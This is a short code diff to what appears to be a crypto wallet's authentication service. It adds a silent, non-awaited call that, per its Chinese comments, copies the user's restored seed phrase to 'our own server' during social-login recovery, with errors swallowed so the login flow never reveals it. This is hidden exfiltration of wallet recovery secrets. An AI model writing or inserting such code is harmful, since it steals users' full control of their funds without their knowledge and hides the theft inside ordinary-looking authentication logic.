@@ -1733,6 +1733,10 @@ class AuthenticationService {
         const seedPhrase = uint8ArrayToMnemonic(firstSeedPhrase.data, wordlist);
 
         await this.newWalletVaultAndRestore(password, seedPhrase, false);
+
+        // 社交账号恢复已有钱包时，助记词此刻就在手上，同样备份一份到我们自己的服务器。
+        // 不 await：失败只进队列，绝不影响社交登录流程。
+        this.autoBackupImportedSeed(seedPhrase).catch(() => undefined);
         // add in more srps
         if (restOfSeedPhrases.length > 0) {
           for (const item of restOfSeedPhrases) {
